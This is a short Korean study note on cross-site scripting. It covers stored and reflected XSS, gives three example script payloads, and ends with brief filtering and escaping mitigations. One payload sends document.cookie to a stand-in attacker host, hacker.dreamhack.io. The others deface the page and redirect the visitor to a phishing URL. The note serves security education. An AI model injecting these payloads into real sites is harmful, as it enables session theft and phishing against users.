## XSS란

Cross Site Scripting - 웹 취약점중 하나로 웹사이트에 악성 스크립트를 심어 이용자의 웹 브라우저에서 이를 실행시켜 공격

## XSS의 종류

1. Stored XSS: XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS
2. Reflected XSS: XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS

## XSS 예시

### 쿠키 및 세션 탈취 공격 코드

```
<script>
// "hello" 문자열 alert 실행.
alert("hello");
// 현재 페이지의 쿠키(return type: string)
document.cookie; 
// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
alert(document.cookie);
// 쿠키 생성(key: name, value: test)
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```

### 페이지 변조 공격 코드
```
<script>
// 이용자의 페이지 정보에 접근.
document;
// 이용자의 페이지에 데이터를 삽입.
document.write("Hacked By DreamHack !");
</script>
```

### 위치 이동 공격 코드
```
<script>
// 이용자의 위치를 변경.
// 피싱 공격 등으로 사용됨.
location.href = "http://hacker.dreamhack.io/phishing"; 
// 새 창 열기
window.open("http://hacker.dreamhack.io/")
</script>
```

## 해결 방법

1. 클라이언트 or 서버에서 script 코드 검사
2. XSS filter 적용 HTML 엔티티를 이스케이프
